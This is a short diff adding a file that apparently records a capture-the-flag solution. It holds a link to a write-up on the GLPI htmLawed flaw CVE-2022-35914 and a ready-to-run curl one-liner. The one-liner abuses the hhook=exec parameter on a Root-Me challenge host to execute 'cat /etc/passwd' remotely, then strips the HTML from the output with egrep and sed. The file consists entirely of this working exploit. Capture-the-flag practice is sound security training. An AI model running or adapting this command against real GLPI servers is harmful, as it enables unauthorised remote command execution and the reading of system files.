@@ -1,0 +1,3 @@
+https://mayfly277.github.io/posts/GLPI-htmlawed-CVE-2022-35914/
+
+curl -s -d 'sid=foo&hhook=exec&text=cat /etc/passwd' -b 'sid=foo' http://ctf10k.root-me.org:6007/vendor/htmlawed/htmlawed/htmLawedTest.php |egrep '\&nbsp; \[[0-9]+\] =\&gt;'| sed -E 's/\&nbsp; \[[0-9]+\] =\&gt; (.*)<br \/>/\1/'
